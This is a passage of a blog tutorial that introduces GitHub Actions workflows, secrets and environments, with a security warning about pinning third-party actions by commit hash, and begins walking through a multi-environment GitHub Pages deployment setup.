&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Qmnzsg55--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2AIN4wR0kIkrFKn6zg9aZgCA.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Qmnzsg55--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2AIN4wR0kIkrFKn6zg9aZgCA.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;This is a “special needs” article but also a general introduction to GitHub Actions.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Since the advent of Single Page Applications the requirements for hosting have been reduced to a minimum. Anything that can serve a static HTML file will do the job just fine and the browser, bombarded with Javascript, does the heavy lifting. High availability and security is a totally different topic of course but in this case I believe GitHub has you covered.&lt;/p&gt;

&lt;p&gt;With &lt;a href="https://pages.github.com"&gt;Pages&lt;/a&gt; GitHub offers a very convenient service for hosting such an app. You push to your repository and GitHub updates the deployment for you. You even get a nice subdomain like &lt;code&gt;username.github.io&lt;/code&gt; or you can connect your own domain. There’s just one downside.&lt;/p&gt;

&lt;p&gt;If your project is not just a literally very static website but an actual “app” and you are working together with other people, you probably want to have multiple deployments, like a development and a staging environment. The problem is… A repository on GitHub can only have a single GitHub Page instance and you probably don’t want to maintain a mirror repository for each of your environments, so you’ll end up using an external hosting service and then you start questioning GitHub Pages as your preferred hosting solution all together. In this article I will show you what I did to “stay on GitHub“.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#github-actions-amp-workflows"&gt;
  &lt;/a&gt;
  GitHub Actions &amp;amp; Workflows
&lt;/h3&gt;

&lt;p&gt;Not only does GitHub offer free hosting but also free and pretty flexible and powerful workflow automation with &lt;a href="https://github.com/features/actions"&gt;GitHub Actions&lt;/a&gt;. If you are not already familiar with CI/CD and GitHub Actions in particular, I recommend you to change that asap. I ignored this topic for far too long but now I’m a huge fan. It simply gives you superpowers.&lt;/p&gt;

&lt;p&gt;I’ll try to give you a brief but effective introduction:&lt;/p&gt;

&lt;p&gt;GitHub runs &lt;a href="https://github.com/actions/virtual-environments"&gt;virtual machines&lt;/a&gt; that act as task runners for your projects. Those tasks can either run on a schedule, as a cronjob, or get &lt;a href="https://docs.github.com/en/actions/reference/events-that-trigger-workflows"&gt;triggered by events&lt;/a&gt; that occur on GitHub, like pushing commits to a branch, opening or closing issues or commenting on them, to name some common ones. These tasks can be comprised of multiple steps that can be chained together and depend on one another, hence the term &lt;em&gt;Workflows&lt;/em&gt;. The terminology is the following: &lt;em&gt;Workflows&lt;/em&gt; have one or more &lt;em&gt;jobs&lt;/em&gt;, each with one or more &lt;em&gt;steps&lt;/em&gt;, which can make use of an &lt;em&gt;action&lt;/em&gt;, which can have &lt;em&gt;inputs&lt;/em&gt; and &lt;em&gt;outputs&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Actions are the “atoms” a workflow is made of, so to say. An action is a repository on GitHub, containing an &lt;code&gt;action.yml&lt;/code&gt; file, describing its inputs and outputs. That means an action can basically do anything you want. It is worth mentioning though, that you actually don’t even have to use actions in your workflows at all. You can also just run arbitrary commands on the operating system the workflow runs on and sometimes that is all you need. You can think of GitHub Workflows simply as… “executing stuff” on a virtual machine that GitHub spawns for you on demand.&lt;/p&gt;

&lt;p&gt;To add a new workflow you need to add a YAML configuration file inside the &lt;code&gt;.github/workflows&lt;/code&gt; directory of your repository. GitHub will automatically pick that up and run it according to the terms you configure. Here’s a &lt;code&gt;hello-world.yml&lt;/code&gt; that shows probably the most simple and useless workflow possible:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Hello World&lt;/span&gt;  
&lt;span class="na"&gt;on&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
  &lt;span class="na"&gt;schedule&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
    &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;cron&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="s"&gt;0&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;0&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;*&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;*&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;*'&lt;/span&gt;  
&lt;span class="na"&gt;jobs&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
  &lt;span class="na"&gt;hello-world&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
    &lt;span class="na"&gt;runs-on&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;ubuntu-latest&lt;/span&gt;  
    &lt;span class="na"&gt;steps&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;run&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;echo Hello World!&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;em&gt;(I’ll not cover the YAML format in this article but I’ll tell you that the dashes represent items in an array and if there are no dashes you are dealing with object keys. If there are dashes followed by… no dashes… it’s an array of objects. In contrast to plain JSON it supports single quotes and comments. Everything that is not quoted is considered a string, unless it’s obviously not a string.&lt;/em&gt; &lt;a href="http://yaml.org/spec/1.2/spec.html#id2759572"&gt;&lt;em&gt;YAML is a superset of JSON.&lt;/em&gt;&lt;/a&gt; &lt;em&gt;Wait… Did I just… anyway…)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Once a day at 0:00 o’clock this workflow runs and prints “Hello World!” to some virtual Ubuntu machine’s &lt;em&gt;stdout&lt;/em&gt;, somewhere in GitHub’s networks. It does not use any action but instead runs an &lt;em&gt;echo&lt;/em&gt; command. A single step can either &lt;em&gt;run&lt;/em&gt; commands OR &lt;em&gt;use&lt;/em&gt; an action.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="na"&gt;jobs&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
  &lt;span class="na"&gt;hello-world&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
    &lt;span class="na"&gt;runs-on&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;ubuntu-latest&lt;/span&gt;  
    &lt;span class="na"&gt;steps&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;uses&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;hello-world/say-action@v1&lt;/span&gt;  
        &lt;span class="na"&gt;with&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
          &lt;span class="na"&gt;say&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Hello World!&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;You set the inputs of an action, if it has any, by using the &lt;em&gt;with&lt;/em&gt; keyword. I’d have called it &lt;em&gt;inputs&lt;/em&gt; but who cares.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#outputs-and-dependent-jobs"&gt;
  &lt;/a&gt;
  Outputs and Dependent Jobs
&lt;/h4&gt;

&lt;p&gt;If an action has outputs, you can use them in consecutive steps of the same job. The step with the outputs just needs an &lt;em&gt;id&lt;/em&gt; to be referenced by other steps.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="na"&gt;jobs&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
  &lt;span class="na"&gt;hello-world&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
    &lt;span class="na"&gt;runs-on&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;ubuntu-latest&lt;/span&gt;  
    &lt;span class="na"&gt;steps&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;id&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;get-name&lt;/span&gt;  
        &lt;span class="na"&gt;uses&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;hello-world/get-name-action@v1&lt;/span&gt; &lt;span class="c1"&gt;# has a "name" output  &lt;/span&gt;
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;uses&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;hello-world/greet-action@v1&lt;/span&gt;          
        &lt;span class="na"&gt;with&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
          &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;${{ steps.get-name.outputs.name }}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;To make a job dependent on a previous one and thus allow it to use its outputs, you must specify which outputs exactly to make available and then you define an array of &lt;em&gt;“needs”&lt;/em&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="na"&gt;jobs&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
  &lt;span class="na"&gt;get-name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
    &lt;span class="na"&gt;runs-on&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;ubuntu-latest&lt;/span&gt;  
    &lt;span class="na"&gt;outputs&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
      &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;${{ steps.get-name.outputs.name }}&lt;/span&gt;  
    &lt;span class="na"&gt;steps&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;id&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;get-name&lt;/span&gt;  
        &lt;span class="na"&gt;uses&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;hello-world/get-name-action@v1&lt;/span&gt; &lt;span class="c1"&gt;# has a "name" output&lt;/span&gt;

  &lt;span class="na"&gt;say-name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
    &lt;span class="na"&gt;runs-on&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;ubuntu-latest&lt;/span&gt;  
    &lt;span class="na"&gt;steps&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;uses&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;hello-world/greet-action@v1&lt;/span&gt;          
        &lt;span class="na"&gt;with&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
          &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;${{ steps.get-name.outputs.name }}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h4&gt;
  &lt;a href="#secrets-amp-environments"&gt;
  &lt;/a&gt;
  Secrets &amp;amp; Environments
&lt;/h4&gt;

&lt;p&gt;Sometimes you need to use credentials, like an API key and you don’t want to expose such values in your workflow file directly. In your repository’s settings you’ll find a section called “Secrets”.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--aO-SKDp5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2Ad9eZlMqTucjIdpCX3YmmVA.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--aO-SKDp5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2Ad9eZlMqTucjIdpCX3YmmVA.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here you can define those values and you can use them in your workflows like this.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="na"&gt;steps&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
  &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;run&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;echo ${{ secrets.SECRET_STRING }}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Secrets can also be defined for an entire organization on GitHub (go to its settings and there “Secrets”), to be available in all workflows across all repositories of that organization. On the other hand, you can also further restrict access to secrets. That’s what &lt;a href="https://docs.github.com/en/actions/reference/environments"&gt;environments&lt;/a&gt; are for. Think of them as “categories” of secrets in a certain repository.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s---8IGShO2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2AF3YUv1fb3_PqmH9TDTCVPg.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s---8IGShO2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2AF3YUv1fb3_PqmH9TDTCVPg.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can &lt;a href="https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions#jobsjob_idenvironment"&gt;tell a workflow job what environment’s secrets it can access&lt;/a&gt;. Let’s say you’ve created an environment in your repository’s settings called &lt;em&gt;development.&lt;/em&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="na"&gt;jobs&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
  &lt;span class="na"&gt;hello-world&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
    &lt;span class="na"&gt;runs-on&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;ubuntu-latest&lt;/span&gt;  
    &lt;span class="na"&gt;environment&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;development&lt;/span&gt;  
    &lt;span class="na"&gt;steps&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;run&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;echo ${{ secrets.DEVELOPMENT_ENV_SECRET }}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the environment settings you’ll see that access can also be restricted to certain branches, so that only a workflow that was triggered by an event related to a matching branch has access to the environment’s secrets and you can also require an admin to approve those workflow runs before they actually run.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ft-l5UE_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2AAnVvdJJW9wW8aJFFtpg6BA.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ft-l5UE_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2AAnVvdJJW9wW8aJFFtpg6BA.png" alt=""&gt;&lt;/a&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--qcBg2dbI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2ARr1KzpVoi3PhippSgRvpRQ.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--qcBg2dbI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2ARr1KzpVoi3PhippSgRvpRQ.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We’ll use that later in the article.&lt;/p&gt;

&lt;p&gt;After digesting this very condensed information you should have a feeling for how powerful and flexible these workflows can be and that you can basically do anything you can imagine. For example, I am using them to integrate cryptocurrency payments into deployment pipelines on GitHub but that’s a top secret project and you better erase that information from your memory right now. Ok? Good. Thanks.&lt;/p&gt;

&lt;p&gt;If you want to dive deeper into GitHub Actions on your own, browse through &lt;a href="https://docs.github.com/en/actions"&gt;the docs&lt;/a&gt; and if you want to start experimenting, I recommend adding &lt;a href="https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions"&gt;Workflow syntax for GitHub Actions&lt;/a&gt; and &lt;a href="https://docs.github.com/en/actions/reference/events-that-trigger-workflows"&gt;Events that trigger workflows&lt;/a&gt; to your bookmarks.&lt;/p&gt;
&lt;h4&gt;
  &lt;a href="#attention-a-quick-note-on-security-when-using-secrets-with-unofficialunverified-actions"&gt;
  &lt;/a&gt;
  ATTENTION: A quick note on security when using secrets with unofficial/unverified actions!
&lt;/h4&gt;

&lt;p&gt;As mentioned, actions can take inputs. Those inputs can be secrets. A common example is Docker:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="na"&gt;jobs&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
  &lt;span class="na"&gt;build-and-push-docker-image&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
    &lt;span class="na"&gt;runs-on&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;ubuntu-latest&lt;/span&gt;  
    &lt;span class="na"&gt;steps&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Login to DockerHub&lt;/span&gt;  
        &lt;span class="na"&gt;uses&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;docker/login-action@v1&lt;/span&gt;   
        &lt;span class="na"&gt;with&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
          &lt;span class="na"&gt;username&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;${{ secrets.DOCKERHUB_USERNAME }}&lt;/span&gt;  
          &lt;span class="na"&gt;password&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;${{ secrets.DOCKERHUB_TOKEN }}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The action being used here is &lt;a href="https://github.com/marketplace/actions/docker-login"&gt;&lt;em&gt;docker/login-action&lt;/em&gt;&lt;/a&gt;&lt;em&gt;,&lt;/em&gt; which is a verified action:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--S2U1MP0B--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2AZmdyb9cdwFHHuJM43YE9fQ.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--S2U1MP0B--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2AZmdyb9cdwFHHuJM43YE9fQ.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;What version of the action you use is specified by the &lt;code&gt;@v1&lt;/code&gt; at the end, which is a branch or tag name. Now, Docker might be a trustworthy author but even trusted organizations might have a new team member every now and then and sometimes new team members turn out to be not as trustworthy as the rest of the organization they just joined and security policies are sometimes more a theoretical thing. Anyway… At the latest when working with unverified actions you need to be aware of one thing (in case you aren’t already):&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#the-code-referenced-by-a-tag-can%C2%A0change"&gt;
  &lt;/a&gt;
  &lt;strong&gt;The code referenced by a tag can change!&lt;/strong&gt;
&lt;/h4&gt;

&lt;p&gt;That means: An action you pass one of your secrets to, can today be your best friend and tomorrow steal your most secret secrets, without you ever even knowing, and reveal them to your worst enemies, who are browsing the dark web looking for the latest hacks and leaks!&lt;/p&gt;

&lt;p&gt;If in any doubt, reference an action by a commit hash, like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Login to shady service&lt;/span&gt;  
  &lt;span class="na"&gt;uses&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;trustme/spy-action@`172239021f7ba04fe7327647b213799853a9eb89`&lt;/span&gt;  
  &lt;span class="na"&gt;with&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;  
    &lt;span class="na"&gt;password&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;${{ secrets.SUPER_SECURE_PASSWORD }}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;AND&lt;/strong&gt; make sure that the code referenced by that commit hash actually does what the readme says it does. If you don’t… well… then just use the tag name. You have been warned (by &lt;a href="https://docs.github.com/en/actions/learn-github-actions/finding-and-customizing-actions#using-release-management-for-your-custom-actions"&gt;the docs&lt;/a&gt; too).&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#my-github-pages%C2%A0scenario"&gt;
  &lt;/a&gt;
  My GitHub Pages Scenario
&lt;/h3&gt;

&lt;p&gt;Now that you should be up to speed with GitHub Actions and Workflows and everything, I’ll finally go into my specific real-world-scenario where a few workflows manage multiple GitHub Pages instances, representing different environments for the app I was working on.&lt;/p&gt;

&lt;p&gt;I needed three environments that behave like this:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  &lt;strong&gt;Production&lt;/strong&gt;: The app that users will actually use. Updated on push to main branch, requiring admin approval.&lt;/li&gt;
&lt;li&gt;  &lt;strong&gt;Development&lt;/strong&gt;: Preview of the latest development progress. Updated on push to development branch.&lt;/li&gt;
&lt;li&gt;  &lt;strong&gt;Staging&lt;/strong&gt;: “Phoenix” deployments, created for pull requests from feature branches and deleted on close, which includes merges.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The main repository, just called “&lt;em&gt;app”&lt;/em&gt;, does not have it’s own GitHub Page. Instead there are two additional repositories, “&lt;em&gt;app-prod”&lt;/em&gt; and “&lt;em&gt;app-dev”&lt;/em&gt;. I mentioned in the beginning, that you surely don’t want to maintain any mirror repositories and that’s why these repositories only hold a build of the app and have their GitHub Page enabled. That’s their only purpose. Additionally each pull request on the development branch will result in a new repository named &lt;em&gt;“app-pr-”.&lt;/em&gt; Here’s a visualization:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--dcBf8W4C--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2ApWeMVfOT5Hf15njwAHHLpw.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--dcBf8W4C--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/800/1%2ApWeMVfOT5Hf15njwAHHLpw.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#workflow-development-build-and%C2%A0deploy"&gt;
  &lt;/a&gt;
  Workflow: Development Build and Deploy
&lt;/h4&gt;

&lt;p&gt;Let’s start with the development deployment, since it’s the most straight forward without any extras. Take a look at &lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml"&gt;this workflow file&lt;/a&gt; and then I’ll guide you through it step by step. The gist of what happens is, we checkout the repository, build the app and push that build to the &lt;em&gt;app-dev&lt;/em&gt; repository.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1.)&lt;/strong&gt; The workflow runs when new commits are pushed to the development branch but not for changes that only affect the workflow files themselves or any markdown files:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L2-L7"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L2-L7&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2.)&lt;/strong&gt; We set the URL that is connected to the &lt;em&gt;app-dev&lt;/em&gt; repository’s GitHub Page as a global environment variable, to use it later in the workflow:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L8-L9"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L8-L9&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3.)&lt;/strong&gt; There’s actually just one job, with a lot of steps, that runs on a &lt;em&gt;ubuntu-latest&lt;/em&gt; virtual machine, using secrets we configured for our development environment in the repository settings:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L11-L16"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L11-L16&lt;/a&gt;&lt;br&gt;&lt;br&gt;
&lt;strong&gt;FYI:&lt;/strong&gt; Setting the &lt;em&gt;url&lt;/em&gt; key for the environment only means that GitHub will show a link to that URL in different places on github.com, like in a related pull request or &lt;a href="https://github.com/OpenQDev/app/deployments"&gt;the repository’s deployments overview&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4.)&lt;/strong&gt; We use &lt;a href="https://github.com/actions/setup-node"&gt;an official action&lt;/a&gt; (actions provided by the &lt;em&gt;actions&lt;/em&gt; GitHub organization) to prepare Node.js on the VM:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L18-L19"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L18-L19&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;5.)&lt;/strong&gt; We use normal Git commands to set the GitHub Actions bot as the commit author, because later we will commit and push changes to a repository:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L22-L25"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L22-L25&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;6.)&lt;/strong&gt; We checkout the repository to a &lt;em&gt;build&lt;/em&gt; directory, using &lt;a href="https://github.com/actions/checkout"&gt;the official checkout action&lt;/a&gt;:&lt;br&gt;&lt;br&gt;
&lt;a href="https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L27-L30"&gt;https://github.com/OpenQDev/app/blob/715573cd6ceebe87e7e235180510eaacacb7d74a/.github/workflows/deploy-dev.yml#L27-L30&lt;/a&gt;&lt;br&gt;&lt;br&gt;
&lt;strong&gt;FYI:&lt;/strong&gt; If you don’t pass a specific repository name to the checkout action, like in step 8, it will simply checkout the repository in which the workflow lives.&lt;/p&gt;

